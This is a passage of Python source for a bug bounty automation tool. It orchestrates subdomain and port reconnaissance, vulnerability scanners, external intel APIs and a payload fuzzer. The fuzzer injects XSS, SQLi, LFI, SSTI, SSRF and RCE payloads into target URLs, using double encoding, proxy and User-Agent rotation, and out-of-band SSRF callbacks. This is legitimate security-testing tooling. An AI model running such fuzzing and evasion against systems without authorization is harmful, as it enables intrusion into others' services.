            issues.append({"type":"csp", "issue":"no nonce/hash/strict-dynamic", "raw": policy})
    out_file.write_text(json.dumps(issues, indent=2))

# -------------------- Scanners --------------------
async def stage_scan(urls_file: Path, scan_dir: Path, interactsh_enabled: bool = False) -> Dict[str, int]:
    ensure_dir(scan_dir); urls = read_lines(urls_file); counts = {"tools": 0, "lines": 0}
    if not urls: return counts
    nuclei_jsonl = scan_dir / "nuclei.jsonl"
    if tool_exists("nuclei"):
        interactions = " -interactions " if interactsh_enabled else ""
        rc, out, err = await run_cmd(f"nuclei -silent -severity medium,high,critical -rl 200 -jsonl -o {nuclei_jsonl}{interactions}", input_lines=urls, timeout=3600)
        if err.strip(): console.log(f"[yellow]nuclei stderr[/]\n{err.strip()}")
        n = len(read_lines(nuclei_jsonl)); counts["lines"] += n; counts["tools"] += 1; console.log(f"[green]nuclei[/] {n}")
    if tool_exists("dalfox"):
        out_path = scan_dir / "dalfox.txt"
        rc, out, err = await run_cmd(f"dalfox pipe --skip-bav -o {out_path}", input_lines=urls, timeout=3600)
        if err.strip(): console.log(f"[yellow]dalfox stderr[/]\n{err.strip()}")
        n = len(read_lines(out_path)); counts["lines"] += n; counts["tools"] += 1; console.log(f"[green]dalfox[/] {n}")
    if tool_exists("kxss"):
        out_path = scan_dir / "kxss.txt"
        rc, out, err = await run_cmd("kxss", input_lines=urls, timeout=2400)
        if err.strip(): console.log(f"[yellow]kxss stderr[/]\n{err.strip()}")
        n = write_lines(out_path, out); counts["lines"] += n; counts["tools"] += 1; console.log(f"[green]kxss[/] {n}")
    return counts

# -------------------- Fuzzer (with budgets/proxies/sqlite) --------------------
def init_cache(db_path: Path):
    con = sqlite3.connect(db_path); cur = con.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS sent (url TEXT, payload TEXT, category TEXT, PRIMARY KEY(url, payload, category))")
    con.commit(); return con

async def stage_payload_fuzz(urls_file: Path, out_file: Path, categories: List[str], max_urls: int = 200, oob_domain: str = "",
                             per_host_budget: int = 50, per_scheme_budget: int = 0,
                             ua_rotate: bool = True, proxy_file: Optional[Path] = None,
                             cache_db: Optional[Path] = None, default_proxy: str = "", encode_level: int = 2) -> int:
    if requests is None: console.print("[yellow]requests not installed; skipping payload fuzz[/]"); return 0
    urls = read_lines(urls_file)[:max_urls]
    if not urls: return 0
    cat_map = {"xss": xss_payloads, "lfi": lfi_payloads, "sqli": sqli_payloads, "domxss": dom_xss_payloads, "ssti": ssti_payloads, "ssrf": ssrf_payloads, "rce": rce_payloads}
    proxies = []
    if proxy_file and Path(proxy_file).exists(): proxies = [l.strip() for l in read_lines(proxy_file) if l.strip()]
    if default_proxy: proxies = [default_proxy] + proxies
    proxy_idx = 0

    con = init_cache(cache_db) if cache_db else None
    seen = set()  # in-memory guard for this run
    budget: Dict[Tuple[str,str],int] = {}

    def should_skip(u, p, c):
        if con:
            try:
                cur = con.cursor(); cur.execute("INSERT OR IGNORE INTO sent(url,payload,category) VALUES(?,?,?)", (u,p,c)); con.commit()
                cur.execute("SELECT changes()"); ch = cur.fetchone()[0]
                return ch == 0
            except Exception: return False
        key = (u,p,c)
        if key in seen: return True
        seen.add(key); return False

    def host_key(u: str):
        sp = urlsplit(u)
        if per_scheme_budget and per_scheme_budget > 0:
            return (sp.scheme, sp.netloc)
        return ("*", sp.netloc)

    def task(u, p, c):
        nonlocal proxy_idx
        hk = host_key(u)
        cnt = budget.get(hk, 0)
        limit = (per_scheme_budget if per_scheme_budget else per_host_budget)
        if cnt >= limit: return {"skip":"budget"}
        budget[hk] = cnt + 1

        if should_skip(u, p, c): return {"skip":"cache"}

        headers = {}
        if ua_rotate: headers["User-Agent"] = random.choice(USER_AGENTS)
        if c == "ssrf" and oob_domain:
            headers["X-Forwarded-Host"] = oob_domain
            headers["Referer"] = f"http://{oob_domain}/"

        # Optional URL-encoding (once or twice)
        enc_payload = encode_times(p, encode_level) if encode_level else p
        target = inject_query(u, enc_payload)
        kw = {"timeout": 8, "allow_redirects": True, "verify": False, "headers": headers}
        if proxies:
            proxy = proxies[proxy_idx % len(proxies)]; proxy_idx += 1
            kw["proxies"] = {"http": proxy, "https": proxy}
        try:
            r = requests.get(target, **kw)
            body = ""
            try: body = r.text[:4096]
            except Exception: pass
            return {"url": u, "target": target, "payload": p, "payload_encoded": enc_payload, "status": r.status_code, "reflected": (p in body or enc_payload in body), "category": c}
        except Exception as e:
            return {"url": u, "target": target, "payload": p, "payload_encoded": enc_payload, "error": str(e), "category": c}

    results = 0
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex, out_file.open("a", encoding="utf-8") as f:
        futs = []
        for u in urls:
            for c in categories:
                plist = list(cat_map.get(c, []))
                if c == "ssrf" and oob_domain:
                    plist += [f"http://{oob_domain}/", f"http://{oob_domain}:80/", f"http://{oob_domain}:8080/", f"http://user@{oob_domain}/"]
                for pld in plist:
                    futs.append(ex.submit(task, u, pld, c))
        for fut in as_completed(futs):
            item = fut.result()
            if not item.get("skip"):
                f.write(json.dumps(item) + "\n"); results += 1

    if con:
        try: con.close()
        except Exception: pass

    console.log(f"[green]payload-fuzz[/] wrote {results} NDJSON → {out_file.name}")
    return results

async def stage_payload_report(ndjson_file: Path, report_dir: Path) -> None:
    ensure_dir(report_dir)
    if not ndjson_file.exists(): return
    by_cat: Dict[str, List[dict]] = {}; import json as _json
    for line in read_lines(ndjson_file):
        try: item = _json.loads(line)
        except Exception: continue
        by_cat.setdefault(item.get("category","uncat"), []).append(item)
    for cat, items in by_cat.items():
        with (report_dir / f"{cat}.ndjson").open("w", encoding="utf-8") as f:
            for it in items: f.write(_json.dumps(it) + "\n")
    summary = {}
    from collections import Counter
    for cat, items in by_cat.items():
        statuses = {}
        refl = sum(1 for it in items if it.get("reflected"))
        for it in items:
            s = it.get("status"); statuses[s] = statuses.get(s,0)+1
        top_targets = Counter([it.get("target") for it in items if it.get("reflected")]).most_common(10)
        summary[cat] = {"total": len(items), "reflected": refl, "status_counts": statuses, "top_reflections": top_targets}
    with (report_dir / "summary.json").open("w", encoding="utf-8") as f: json.dump(summary, f, indent=2)
    console.print(f"[green]Payload fuzz reports →[/] {report_dir}")

# -------------------- Grep Intel --------------------
def should_grep_url(u: str) -> bool:
    try:
        path = urlsplit(u).path.lower()
        if any(path.endswith(ext) for ext in GREP_EXTS):
            return True
        return False
    except Exception:
        return False

async def stage_grep_intel(urls_file: Path, js_file: Path, out_file: Path, summary_file: Path,
                           max_urls: int = 400, timeout_s: int = 10, max_bytes: int = 1_000_000,
                           default_proxy: str = "", ua_rotate: bool = True) -> int:
    if requests is None:
        console.print("[yellow]requests not installed; skipping grep-intel[/]")
        return 0
    urls = read_lines(urls_file) + read_lines(js_file)
    targets = [u for u in urls if should_grep_url(u)]
    targets = targets[:max_urls]
    if not targets:
        console.log("[yellow]grep-intel[/] no target URLs matching interesting extensions")
        return 0

    results = []
    pattern_objs = [(name, re.compile(rx, re.I)) for name, rx in PATTERNS]

    def fetch_and_grep(u: str):
        headers = {}
        if ua_rotate: headers["User-Agent"] = random.choice(USER_AGENTS)
        kw = {"timeout": timeout_s, "allow_redirects": True, "verify": False, "headers": headers}
        if default_proxy:
            kw["proxies"] = {"http": default_proxy, "https": default_proxy}
        try:
            r = requests.get(u, **kw)
            history = [{"status": rr.status_code, "location": rr.headers.get("Location")} for rr in r.history]
            ct = r.headers.get("Content-Type", "")
            text = r.text if r.text else ""
            if len(text) > max_bytes: text = text[:max_bytes]
            hits = []
            # headers scan
            hdr_blob = "\n".join([f"{k}: {v}" for k,v in r.headers.items()])
            for name, rx in pattern_objs:
                for m in rx.finditer(hdr_blob):
                    s = m.group(0)[:200]
                    hits.append({"where":"header", "pattern": name, "evidence": s})
            # body scan
            for name, rx in pattern_objs:
                for m in rx.finditer(text):
                    s = text[max(0, m.start()-60): m.end()+60]
                    hits.append({"where":"body", "pattern": name, "evidence": s})
            return {"url": u, "status": r.status_code, "content_type": ct, "history": history, "hits": hits}
        except Exception as e:
            return {"url": u, "error": str(e)}

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futs = [ex.submit(fetch_and_grep, u) for u in targets]
        for fut in as_completed(futs):
            results.append(fut.result())

    # write ndjson
    with out_file.open("w", encoding="utf-8") as f:
        for item in results:
            f.write(json.dumps(item) + "\n")

    # summarize
    counts = {}
    top_urls = {}
    for item in results:
        for h in item.get("hits", []):
            name = h["pattern"]
            counts[name] = counts.get(name, 0) + 1
            url = item["url"]
            top_urls.setdefault(name, {})
            top_urls[name][url] = top_urls[name].get(url, 0) + 1
    summary = {"pattern_counts": counts, "top_urls": {k: sorted(v.items(), key=lambda x: x[1], reverse=True)[:10] for k,v in top_urls.items()}}
    summary_file.write_text(json.dumps(summary, indent=2))
    console.log(f"[green]grep-intel[/] done → {out_file.name}, {summary_file.name}")
    return len(results)

# -------------------- External Intel APIs --------------------
def intel_collect_ips(dnsx_file: Path, httpx_json_file: Path) -> List[str]:
    ips = []
    for line in read_lines(dnsx_file):
        try:
            j = json.loads(line); ip = j.get("a") or j.get("ip") or j.get("answer")
            if isinstance(ip, list): ips += [x for x in ip if isinstance(x,str)]
            elif isinstance(ip, str): ips.append(ip)
        except Exception: pass
    for line in read_lines(httpx_json_file):
        try:
            j = json.loads(line); ip = j.get("ip"); 
            if ip: ips.append(ip if isinstance(ip,str) else str(ip))
        except Exception: pass
    return sorted(set(ips))

def intel_censys(domain: str, ips: List[str], out_file: Path, censys_id: str, censys_secret: str, limit: int = 100) -> int:
    if not (requests and censys_id and censys_secret): return 0
    url = "https://search.censys.io/api/v2/hosts/search"
    q = f"services.service_name: HTTP AND (services.http.response.body: {domain} OR dns.names: {domain})"
    try:
        r = requests.get(url, params={"q": q, "per_page": min(50, limit)}, auth=(censys_id, censys_secret), timeout=20)
        if r.status_code != 200: out_file.write_text(json.dumps({"status": r.status_code, "error": r.text[:500]})); return 0
        data = r.json()
        out_file.write_text(json.dumps(data, indent=2))
        return len(data.get("result", {}).get("hits", []))
    except Exception as e:
        out_file.write_text(json.dumps({"error": str(e)})); return 0

def intel_fofa(domain: str, out_file: Path, email: str, key: str, limit: int = 100) -> int:
    if not (requests and email and key): return 0
    try:
        q = base64.b64encode(f'domain="{domain}"'.encode()).decode()
        url = "https://fofa.info/api/v1/search/all"
        r = requests.get(url, params={"email": email, "key": key, "qbase64": q, "size": min(10000, limit)}, timeout=20)
        if r.status_code != 200: out_file.write_text(json.dumps({"status": r.status_code, "error": r.text[:500]})); return 0
        out_file.write_text(r.text); 
        try:
            data = r.json(); return len(data.get("results", []))
        except Exception:
            return 0
    except Exception as e:
        out_file.write_text(json.dumps({"error": str(e)})); return 0

def intel_virustotal(domain: str, out_dir: Path, api_key: str, limit: int = 100) -> int:
    if not (requests and api_key): return 0
    headers = {"x-apikey": api_key}
    hits = 0
    try:
        r = requests.get(f"https://www.virustotal.com/api/v3/domains/{domain}", headers=headers, timeout=20)
        (out_dir / "vt_domain.json").write_text(r.text)
        if r.status_code == 200: hits += 1
        r2 = requests.get(f"https://www.virustotal.com/api/v3/domains/{domain}/subdomains", headers=headers, params={"limit": min(40,limit)}, timeout=20)
        (out_dir / "vt_subdomains.json").write_text(r2.text)
        if r2.status_code == 200: hits += 1
    except Exception as e:
        (out_dir / "vt_error.json").write_text(json.dumps({"error": str(e)}))
    return hits

def intel_urlscan(domain: str, out_file: Path, api_key: str = "", limit: int = 100) -> int:
    headers = {"API-Key": api_key} if api_key else {}
    try:
        r = requests.get("https://urlscan.io/api/v1/search/", params={"q": f"domain:{domain}", "size": min(100, limit)}, headers=headers, timeout=20)
        out_file.write_text(r.text)
        if r.status_code == 200:
            try: return len(r.json().get("results", []))
            except Exception: return 0
        return 0
    except Exception as e:
        out_file.write_text(json.dumps({"error": str(e)})); return 0

def intel_binaryedge(ips: List[str], out_dir: Path, api_key: str, limit: int = 50) -> int:
    if not (requests and api_key): return 0
    headers = {"X-Key": api_key}
    count = 0
    with (out_dir / "binaryedge.jsonl").open("w", encoding="utf-8") as f:
        for ip in ips[:limit]:
            try:
                r = requests.get(f"https://api.binaryedge.io/v2/query/ip/{ip}", headers=headers, timeout=20)
                f.write(r.text.strip() + "\n"); 
                count += 1
            except Exception as e:
                f.write(json.dumps({"ip": ip, "error": str(e)}) + "\n")
    return count

def stage_external_intel(domain: str, dnsx_file: Path, httpx_json_file: Path, out_dir: Path,
                         censys_id: str, censys_secret: str, fofa_email: str, fofa_key: str,
                         vt_key: str, urlscan_key: str, binaryedge_key: str, shodan_key: str) -> Dict[str, int]:
    ensure_dir(out_dir)
    ips = intel_collect_ips(dnsx_file, httpx_json_file)
    counts = {}
    if shodan_key:
        shodan_file = out_dir / "shodan.jsonl"
        counts["shodan"] = shodan_lookup_ips(ips, shodan_file, shodan_key)
    counts["censys"] = intel_censys(domain, ips, out_dir / "censys.json", censys_id, censys_secret) if censys_id and censys_secret else 0
    counts["fofa"]  = intel_fofa(domain, out_dir / "fofa.json", fofa_email, fofa_key) if fofa_email and fofa_key else 0
    counts["virustotal"] = intel_virustotal(domain, out_dir, vt_key) if vt_key else 0
    counts["urlscan"] = intel_urlscan(domain, out_dir / "urlscan.json", urlscan_key) if True else 0
    counts["binaryedge"] = intel_binaryedge(ips, out_dir, binaryedge_key) if binaryedge_key else 0
    console.print(Panel(json.dumps(counts, indent=2), title="External Intel Summary", border_style="cyan"))
    return counts

# ---- SSRF candidates ----
SSRF_PARAM_HINTS = {"url","uri","path","dest","redirect","redirect_uri","redirect_url","next","return","image","u","target","to","continue","callback","link","file","download","fetch","proxy","feed","json","xml"}

def analyze_ssrf_candidates(urls: List[str]) -> List[dict]:
    out = []
    for u in urls:
        try:
            sp = urlsplit(u)
            q = parse_qsl(sp.query, keep_blank_values=True)
            if not q: 
                continue
            suspects = []
            for k,v in q:
                v_l = (v or "").lower()
                k_l = (k or "").lower()
                score = 0
                if k_l in SSRF_PARAM_HINTS: score += 2
                if "://" in v_l or v_l.startswith("//"): score += 2
                if re.search(r"(?i)(127\.0\.0\.1|localhost|169\.254\.169\.254|0\.0\.0\.0|10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.(1[6-9]|2\d|3[0-1])\.\d+\.\d+)", v_l): score += 2
                if any(c in v for c in [":","@","$"]): score += 1
                if "&" in v: score += 1
                if score >= 2:
                    suspects.append({"param": k, "value": v, "score": score})
            if suspects:
                out.append({"url": u, "params": suspects})
        except Exception:
            continue
    return out

async def stage_ssrf_candidates(urls_file: Path, js_file: Path, out_file: Path, params_file: Path, max_urls: int = 2000) -> int:
    urls = read_lines(urls_file) + read_lines(js_file)
    urls = urls[:max_urls]
    findings = analyze_ssrf_candidates(urls)
    with out_file.open("w", encoding="utf-8") as f:
        for item in findings:
            f.write(json.dumps(item) + "\n")
    # a simple flat list for quick fuzz targeting
    flat = []
    for item in findings:
        for p in item["params"]:
            flat.append(f'{item["url"]}  {p["param"]}={p["value"]}  score={p["score"]}')
    params_file.write_text("\n".join(flat))
    console.log(f"[green]ssrf-candidates[/] {len(findings)}")
    return len(findings)

# -------------------------------------------------------------------------------------
# Main
# -------------------------------------------------------------------------------------
def parse_args(argv=None):
    p = argparse.ArgumentParser(description="Bug Bounty Multi-Super-Tool Deluxe")
    p.add_argument("-d", "--domain", help="Target domain (e.g., example.com)")
    p.add_argument("-o", "--outdir", default="runs", help="Root output directory when not using --use-workdir")
    p.add_argument("--use-workdir", action="store_true", help="Use ~/work/bug_bountys/<domain>_bugbounty layout")
    p.add_argument("--simulate", action="store_true", help="Simulate seed data (no external tools needed)")
    p.add_argument("-p", "--proxy", default="", help="Default HTTP/HTTPS proxy (e.g., http://127.0.0.1:8080) for tools & fuzzer")

    # Recon toggles
    p.add_argument("--dsieve", action="store_true", help="Filter subs with dsieve")
    p.add_argument("--shuffledns", action="store_true", help="Resolve subs with shuffledns")
    p.add_argument("--massdns", action="store_true", help="Resolve subs with massdns")
    p.add_argument("--resolvers", default="", help="Resolvers file for shuffledns/massdns")
    p.add_argument("--dnsx", action="store_true", help="Run dnsx JSON enumeration (recommended)")
    p.add_argument("--tlsx", action="store_true", help="Run tlsx on alive roots and harvest SANs")
    p.add_argument("--favirecon", action="store_true", help="Run favirecon on alive roots")
    p.add_argument("--csprecon", action="store_true", help="Run csprecon on alive roots")
    p.add_argument("--mmh3-map", default="", help="JSON map for favirecon hashes → names")

    p.add_argument("--naabu", action="store_true", help="Run naabu to find open ports")
    p.add_argument("--nmap", action="store_true", help="Run nmap based on naabu results")

    p.add_argument("--scan", action="store_true", help="Run scanners (nuclei, dalfox, kxss)")
    p.add_argument("--skip-js", action="store_true", help="Skip JS endpoint extraction (linkfinder)")

    p.add_argument("--ffuf", action="store_true", help="Enable ffuf content discovery")
    p.add_argument("--ffuf-wl", default="", help="Wordlist path for ffuf (required if --ffuf)")
    p.add_argument("--ffuf-max", type=int, default=50, help="Max roots to fuzz with ffuf")

    p.add_argument("--cariddi", action="store_true", help="Run cariddi on alive roots")
    p.add_argument("--cloakquest3r", action="store_true", help="Run cloakquest3r if present")
    p.add_argument("--xsrfprobe", action="store_true", help="Run xsrfprobe near the end")
    p.add_argument("--xsstrike", action="store_true", help="Run XSStrike near the end")
    p.add_argument("--ssrfire", action="store_true", help="Run SSRF tool (ssrfire/ssrfmap)")

    p.add_argument("--interactsh", type=int, default=0, help="Enable interactsh-client polling for N seconds")

    # External Intel
    p.add_argument("--ext-intel", action="store_true", help="Run external intel APIs (keys needed)")
    p.add_argument("--shodan-key", default="", help="Shodan API key (or env SHODAN_API_KEY)")
    p.add_argument("--censys-id", default="", help="Censys API ID (or env CENSYS_ID)")
    p.add_argument("--censys-secret", default="", help="Censys API Secret (or env CENSYS_SECRET)")
    p.add_argument("--fofa-email", default="", help="FOFA email (or env FOFA_EMAIL)")
    p.add_argument("--fofa-key", default="", help="FOFA key (or env FOFA_KEY)")
    p.add_argument("--vt-key", default="", help="VirusTotal API key (or env VT_KEY)")
    p.add_argument("--urlscan-key", default="", help="urlscan.io API key (or env URLSCAN_KEY)")
    p.add_argument("--binaryedge-key", default="", help="BinaryEdge API key (or env BINARYEDGE_KEY)")

    p.add_argument("--json-out", default="intel.json", help="Unified JSON filename")
    p.add_argument("--ndjson", action="store_true", help="Emit NDJSON streams (urls/vulns/hosts)")

    # Grep Intel
    p.add_argument("--grep-intel", action="store_true", help="Run regex hunting stage on selected extensions")
    p.add_argument("--grep-max", type=int, default=400, help="Max URLs to fetch in grep-intel")
    p.add_argument("--grep-size", type=int, default=1_000_000, help="Max bytes to scan per response")
    p.add_argument("--grep-timeout", type=int, default=10, help="Timeout per request in grep-intel")

    # Fuzzer controls
    p.add_argument("--fuzz", nargs="*", default=[], help="Payload fuzzing categories: xss lfi sqli domxss ssti ssrf rce")
    p.add_argument("--fuzz-per-host", type=int, default=50, help="Max requests per host for the fuzzer")
    p.add_argument("--fuzz-per-scheme", type=int, default=0, help="Optional per-scheme budget (HTTP and HTTPS separate)")
    p.add_argument("--ua-rotate", action="store_true", help="Rotate common User-Agents")
    p.add_argument("--proxy-file", default="", help="File with proxy URLs to rotate per request (http/https)")
    p.add_argument("--cache-db", default="", help="SQLite path to cache (url,payload,category) and skip repeats")
    p.add_argument("--encode-payloads", type=int, default=2, help="URL-encode payloads N times (0,1,2) before sending")

    p.add_argument("--max-time", type=int, default=0, help="Global timeout in seconds (0=unlimited)")
    p.add_argument("--live-ui", action="store_true", help="Start live D3/NetworkX UI server")
    p.add_argument("--live-bind", default="127.0.0.1:8765", help="Bind host:port for the live UI (default: 127.0.0.1:8765)")
    p.add_argument("--live-open", action="store_true", help="Open a browser to the live UI on start")
    p.add_argument("--viz-html", action="store_true", help="Export static HTML graph at the end (viz_export.py)")

    return p.parse_args(argv)

def welcome():
    body = "Subs → dsieve → shuffledns/massdns → dnsx → httpx → tlsx → URLs → crawl → ports/scans → extras → intel"
    console.print(Panel.fit(body, title="[b]Bug Bounty Multi-Super-Tool Deluxe[/]", border_style="cyan", box=box.ROUNDED))

def pick_domain_interactive() -> str:
    welcome()
    while True:
        d = Prompt.ask("[bold cyan]Enter target domain[/]", default="example.com").strip().lower()
        if valid_domain(d): return d
        console.print("[red]Invalid domain. Try again.[/]")

def simulate_seed(domain: str, nsubs=50, nurls=150):
    subs = [f"app{i}.{domain}" for i in range(nsubs)] + [domain]
    urls = [f"https://{subs[i % len(subs)]}/path{i}?q={i}" for i in range(nurls)]
    return subs, urls

async def main(argv=None):
    args = parse_args(argv)
    domain = args.domain or pick_domain_interactive()

    # Global proxy env for subprocess tools (httpx supports -proxy too)
    if args.proxy:
        os.environ["HTTP_PROXY"] = args.proxy
        os.environ["HTTPS_PROXY"] = args.proxy

    domain_dir = None
    if args.use_workdir:
        domain_dir = Path(setup_folders(domain))
        target_dir = ensure_dir(Path(domain_dir) / stamp())
    else:
        target_dir = ensure_dir(Path(args.outdir) / domain / stamp())

    # Files
    subs_file = target_dir / "subs.txt"
    subs_dsieved = target_dir / "subs_dsieved.txt"
    subs_resolved = target_dir / "subs_resolved.txt"
    urls_file = target_dir / "urls.txt"
    js_file = target_dir / "js.txt"
    alive_roots_file = target_dir / "alive_roots.txt"
    dnsx_file = target_dir / "dnsx.jsonl"
    httpx_json_file = target_dir / "httpx.jsonl"
    naabu_json_file = target_dir / "naabu.jsonl"
    nmap_dir = target_dir / "nmap"
    ffuf_dir = target_dir / "ffuf"
    scan_dir = target_dir / "scan"
    intel_json = target_dir / args.json_out
    interactsh_file = target_dir / "interactsh.jsonl"
    tlsx_out = target_dir / "tlsx.jsonl"
    tlsx_newsubs = target_dir / "subs_from_tls.txt"
    favirecon_file = target_dir / "favirecon.txt"
    csprecon_file = target_dir / "csprecon.txt"
    grep_ndjson = target_dir / "grep_intel.ndjson"
    grep_summary = target_dir / "grep_summary.json"
    ssrf_ndjson = target_dir / "ssrf_candidates.ndjson"
    ssrf_params_txt = target_dir / "ssrf_params.txt"

    # --- Live UI server (optional) ---
    live = None
    if getattr(args, "live_ui", False):
        try:
            from bb_live import LiveService
            live = LiveService(args.live_bind, target_dir)
            live.start(open_browser=args.live_open)
            live.watch_files(
                dnsx=dnsx_file,
                httpx=httpx_json_file,
                naabu=naabu_json_file,
                nuclei=(scan_dir / "nuclei.jsonl"),
                dalfox=(scan_dir / "dalfox.txt"),
                kxss=(scan_dir / "kxss.txt"),
            )
        except Exception as _e:
            console.print(f"[yellow]Live UI init failed:[/] {_e}")
    else:
        live = None

    # External intel out dir
    extintel_dir = target_dir / "extintel"

    ensure_dir(scan_dir)

    console.print(Panel(f"[bold]Target:[/] {domain}\n[bold]Output:[/] {target_dir}", title="Run Config", border_style="magenta"))

    unified = {"domain": domain, "started_at": datetime.utcnow().isoformat() + "Z", "artifacts": {}}

    start = time.time()
    try:
        if args.simulate:
            console.rule("[bold]SIMULATION MODE[/]")
            subs, urls = simulate_seed(domain)
            dedup_append(subs_file, subs); dedup_append(urls_file, urls)
        else:
            console.rule("[bold]Stage 1: Subdomains[/]")
            s1 = await stage_subdomains(domain, subs_file)
            console.log(f"subdomains: tools={s1['tools']} new={s1['lines']}")

            if args.dsieve:
                console.rule("[bold]Stage 1b: dsieve[/]")
                n = await stage_dsieve(subs_file, subs_dsieved)
                if n > 0: subs_file = subs_dsieved

            if args.shuffledns:
                console.rule("[bold]Stage 1c: shuffledns[/]")
                resolvers = Path(args.resolvers) if args.resolvers else None
                n = await stage_shuffledns(domain, subs_file, resolvers, subs_resolved)
                if n > 0: subs_file = subs_resolved

            if args.massdns and not args.shuffledns:
                console.rule("[bold]Stage 1d: massdns[/]")
                resolvers = Path(args.resolvers) if args.resolvers else None
                n = await stage_massdns(subs_file, resolvers, subs_resolved)
                if n > 0: subs_file = subs_resolved

            if args.dnsx or (not args.shuffledns and not args.massdns):
                console.rule("[bold]Stage 2: DNS (dnsx)[/]")
                await stage_dnsx(subs_file, dnsx_file)

            console.rule("[bold]Stage 3: HTTPX tech[/]")
            await stage_probe_httpx(subs_file, alive_roots_file, httpx_json_file, proxy=args.proxy)

            pre_subs = set(read_lines(subs_file))
            if args.tlsx:
                console.rule("[bold]Stage 3b: tlsx[/]")
                t = await stage_tlsx(alive_roots_file, tlsx_out, tlsx_newsubs, pre_subs)
                if t["new_subs"] > 0:
                    dedup_append(subs_file, read_lines(tlsx_newsubs))
                    console.log("[cyan]httpx[/] probing new subs from TLS SANs")
                    await stage_probe_httpx(subs_file, alive_roots_file, httpx_json_file, proxy=args.proxy)

            console.rule("[bold]Stage 4: URLs (gau/katana) + hakrawler[/]")
            await stage_urls(domain, subs_file, urls_file)
            await stage_hakrawler(alive_roots_file, urls_file)

            if not args.skip_js:
                console.rule("[bold]Stage 5: JS endpoints[/]")
                await stage_linkfinder(urls_file, js_file)

            if args.naabu:
                console.rule("[bold]Stage 6: Ports (naabu)[/]")
                await stage_naabu(subs_file, naabu_json_file)
                extra = build_urls_from_naabu(naabu_json_file)
                if extra:
                    console.log(f"[cyan]httpx[/] probing {len(extra)} service-aware URLs")
                    await stage_probe_httpx(subs_file, alive_roots_file, httpx_json_file, extra_urls=extra, proxy=args.proxy)
                    console.log("[cyan]httpx[/] scheme-fallback retry")
                    await stage_probe_httpx(subs_file, alive_roots_file, httpx_json_file, extra_urls=flip_urls_scheme(extra), proxy=args.proxy)

            if args.nmap:
                console.rule("[bold]Stage 7: Nmap[/]")
                await stage_nmap_from_naabu(naabu_json_file, nmap_dir)

            if args.ffuf:
                if not args.ffuf_wl: console.print("[red]--ffuf requires --ffuf-wl path[/]")
                else:
                    console.rule("[bold]Stage 8: ffuf[/]"); await stage_ffuf(alive_roots_file, ffuf_dir, args.ffuf_wl, args.ffuf_max)

            if args.favirecon:
                console.rule("[bold]Stage 9: favirecon[/]")
                await stage_favirecon(alive_roots_file, favirecon_file)
                if args.mmh3_map:
                    mapped_out = favirecon_file.with_name("favirecon_mapped.json")
                    map_favicon_hashes(favirecon_file, Path(args.mmh3_map), mapped_out)

            if args.csprecon:
                console.rule("[bold]Stage 10: csprecon[/]")
                await stage_csprecon(alive_roots_file, csprecon_file)
                analyze_csp_file(csprecon_file, csprecon_file.with_name("csp_analysis.json"))

            if args.cariddi:
                console.rule("[bold]Stage 11: cariddi[/]")
                await stage_cariddi(alive_roots_file, target_dir / "cariddi.txt")

            if args.cloakquest3r:
                console.rule("[bold]Stage 12: cloakquest3r[/]")
                await stage_cloakquest3r(alive_roots_file, target_dir / "cloakquest3r.txt")

            oob_info = {}
            if args.interactsh > 0:
                console.rule("[bold]Stage 13: Interactsh (OOB)[/]")
                oob_info = await stage_interactsh(args.interactsh, interactsh_file)

            # External intel APIs (after we have httpx/dnsx)
            if args.ext_intel:
                console.rule("[bold]Stage 14: External Intel[/]")
                stage_external_intel(
                    domain, dnsx_file, httpx_json_file, extintel_dir,
                    args.censys_id or os.getenv("CENSYS_ID",""),
                    args.censys_secret or os.getenv("CENSYS_SECRET",""),
                    args.fofa_email or os.getenv("FOFA_EMAIL",""),
                    args.fofa_key or os.getenv("FOFA_KEY",""),
                    args.vt_key or os.getenv("VT_KEY",""),
                    args.urlscan_key or os.getenv("URLSCAN_KEY",""),
                    args.binaryedge_key or os.getenv("BINARYEDGE_KEY",""),
                    args.shodan_key or os.getenv("SHODAN_API_KEY","")
                )

            # Grep Intel (juicy files)
            if args.grep_intel:
                console.rule("[bold]Stage 15: Grep Intel[/]")
                await stage_grep_intel(urls_file, js_file, grep_ndjson, grep_summary, max_urls=args.grep_max, timeout_s=args.grep_timeout,
                                       max_bytes=args.grep_size, default_proxy=args.proxy, ua_rotate=args.ua_rotate)

            # SSRF candidates (before fuzz)
            console.rule("[bold]Stage 16: SSRF Candidates[/]")
            await stage_ssrf_candidates(urls_file, js_file, ssrf_ndjson, ssrf_params_txt, max_urls=2000)

            if args.fuzz:
                console.rule("[bold]Stage 17: Payload fuzz[/]")
                fuzz_out = target_dir / "payload_fuzz.ndjson"
                cache_db = Path(args.cache_db) if args.cache_db else (target_dir / "fuzz_cache.sqlite")
                await stage_payload_fuzz(
                    urls_file, fuzz_out, args.fuzz, max_urls=200,
                    oob_domain=(oob_info.get("oob_domain") if oob_info else ""),
                    per_host_budget=args.fuzz_per_host, per_scheme_budget=args.fuzz_per_scheme,
                    ua_rotate=args.ua_rotate, proxy_file=(Path(args.proxy_file) if args.proxy_file else None),
                    cache_db=cache_db, default_proxy=args.proxy, encode_level=max(0, min(2, args.encode_payloads))
                )
                await stage_payload_report(fuzz_out, target_dir / "reports")

            if args.xsrfprobe:
                console.rule("[bold]Stage 18: xsrfprobe[/]")
                await stage_xsrfprobe(urls_file, target_dir / "xsrfprobe.txt", max_urls=120)

            if args.ssrfire:
                console.rule("[bold]Stage 19: SSRF[/]")
                await stage_ssrfire(urls_file, target_dir / "ssrf.txt", max_urls=80)

            if args.xsstrike:
                console.rule("[bold]Stage 20: XSStrike[/]")
                await stage_xsstrike(urls_file, target_dir / "xsstrike.txt", max_urls=80)

            if args.scan:
                console.rule("[bold]Stage 21: Scanning[/]")
                await stage_scan(urls_file, scan_dir, interactsh_enabled=(args.interactsh > 0))

        # Unified manifest
        unified["artifacts"] = {
            "subs_file": str(subs_file),
            "subs_dsieved": str(subs_dsieved),
            "subs_resolved": str(subs_resolved),
            "urls_file": str(urls_file),
            "js_file": str(js_file),
            "alive_roots_file": str(alive_roots_file),
            "dnsx_jsonl": str(dnsx_file),
            "httpx_jsonl": str(httpx_json_file),
            "naabu_jsonl": str(naabu_json_file),
            "nmap_dir": str(nmap_dir),
            "ffuf_dir": str(ffuf_dir),
            "scan_dir": str(scan_dir),
            "interactsh_jsonl": str(interactsh_file),
            "tlsx_jsonl": str(tlsx_out),
            "tlsx_newsubs": str(tlsx_newsubs),
